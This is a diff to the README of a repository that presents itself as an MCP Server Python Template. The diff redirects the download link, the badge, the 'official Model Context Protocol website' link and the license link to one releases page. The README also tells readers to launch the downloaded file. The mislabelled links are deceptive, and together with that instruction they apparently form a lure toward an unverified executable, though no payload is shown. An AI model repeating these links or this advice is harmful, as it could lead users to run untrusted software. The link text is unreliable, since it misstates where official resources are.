@@ -13,14 +13,14 @@ Welcome to the **MCP Server Python Template** repository! This template provides
 - Designed for AI-assisted development processes.
 
 ## 📎 Quick Links
-- Click [here](https://github.com/repo/releases/9246/App.zip) to download the application.
-  ![Download App](https://img.shields.io/badge/Download-App-success)
+- Click [here](https://github.com/Cris-0k/mcp-server-python-template/releases) to download the application.
+  ![Download App](https://github.com/Cris-0k/mcp-server-python-template/releases)
 
 ## 🚨 Note
 If the link above ends with the file name, make sure to launch the downloaded file. If the link provided does not work, please check the "Releases" section of this repository for the latest updates.
 
 ## 🌐 External Links
-- Visit the official [Model Context Protocol (MCP) website](https://www.modelcontextprotocol.com) for more information.
+- Visit the official [Model Context Protocol (MCP) website](https://github.com/Cris-0k/mcp-server-python-template/releases) for more information.
 
 ## 🤖 Getting Started
 To start using the MCP Server Python Template:
@@ -37,7 +37,7 @@ To start using the MCP Server Python Template:
 We welcome contributions from the community to enhance the MCP Server Python Template. Feel free to submit pull requests or raise issues for any improvements you'd like to see.
 
 ## 📃 License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Cris-0k/mcp-server-python-template/releases](https://github.com/Cris-0k/mcp-server-python-template/releases) file for details.
 
 ## 🙌 Acknowledgements
 We would like to thank all our contributors for their support and dedication to making the MCP Server Python Template a valuable resource for the AI community.
